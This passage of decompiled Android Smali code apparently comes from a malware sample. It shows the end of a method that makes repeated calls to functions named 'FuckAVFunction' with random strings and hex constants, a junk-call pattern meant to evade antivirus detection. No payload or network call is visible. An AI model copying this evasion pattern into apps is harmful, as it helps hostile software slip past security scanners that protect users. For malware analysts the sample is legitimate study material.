    const v4, 0x59da274

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-static {v0, v1, v2, v3, v4}, Lcom/androiddg/pgroute/NJqTce;->FuckAVFunction9(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 264
    const-string v0, "AObpGAdW"

    const v1, 0x31dd32a3

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const-string v3, "mwuDBuLRe"

    const v4, 0xa14d255

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const-string v5, "gLRDBeNm"

    const v6, 0x22599cc5

    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/NJqTce;->FuckAVFunction13(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 265
    const-string v0, "BePqFqPF"

    const v1, 0x2f4c2803

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "PBRsNPL"

    const-string v3, "OMIhOOQW"

    const v4, 0x28a274c0

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x1e9e15c1

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/NJqTce;->FuckAVFunction0(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 266
    const v0, 0x6a1efc8

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "qPkBLw"

    const-string v2, "WfUUM"

    const v3, 0x20605ffc

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const v4, 0x329e71ff

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const-string v5, "qNgFcgq"

    const-string v6, "WKhArrbWI"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/NJqTce;->FuckAVFunction12(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 268
    .end local v7    # "i":Landroid/content/Intent;
    :cond_0
    return-void
.end method
